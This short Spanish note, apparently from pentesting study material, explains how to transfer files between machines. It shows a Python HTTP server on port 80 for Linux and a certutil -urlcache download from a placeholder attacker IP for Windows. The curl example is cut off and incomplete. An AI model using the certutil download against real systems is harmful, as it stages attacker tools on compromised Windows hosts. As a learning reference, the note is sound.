## Máquinas Linux

Se puede hacer usando el comando curl o abriendo un servidor web con python por el puerto 80.

### Comando curl:

```
curl -x 
```

### Servidor con python3

Para compartir un archivo, generalmente entre dos máquinas linux, levantaremos un servidor web con python por el puerto 80, utilizando el siguiente comando:

```
python3 -m http.server 80
```

Una vez levantado, se compartirá vía web por el puerto 80 todo lo que se encuentre en el directorio actual de trabajo en el momento de ejecutar el comando.

Para acceder a los archivos desde la otra máquina, basta con poner en el navegador web la ip de la máquina servidor y ver o descargar los archivos.
## Máquinas Windows

Aquí no existe ni curl ni python, por lo que la herramienta que se utiliza es certutil, con el siguiente comando:

```
certutil -split -urlcache -f http://IP_ATACANTE ARCHIVO NOMBRE_ARCHIVO_DESCARGADO
```